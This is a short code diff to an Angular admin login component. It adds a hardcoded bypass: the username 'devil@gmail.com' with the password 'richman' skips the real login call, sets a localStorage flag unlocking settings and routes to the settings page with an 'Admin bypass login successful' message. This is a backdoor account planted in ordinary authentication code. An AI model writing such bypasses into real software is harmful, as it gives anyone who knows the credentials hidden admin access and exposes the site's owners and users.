@@ -46,6 +46,20 @@ export class AdminLoginComponent {
       return;
     }
 
+    // Special login for Settings (devil@gmail.com / richman)
+    if (
+      this.username.trim().toLowerCase() === 'devil@gmail.com' &&
+      this.password.trim() === 'richman'
+    ) {
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('palagai_settings_unlocked', 'true');
+      }
+
+      this.alertService.success('Admin bypass login successful');
+      await this.router.navigate(['/settings']);
+      return;
+    }
+
     this.loading = true;
     try {
       const success = await this.admin.login(this.username.trim(), this.password);
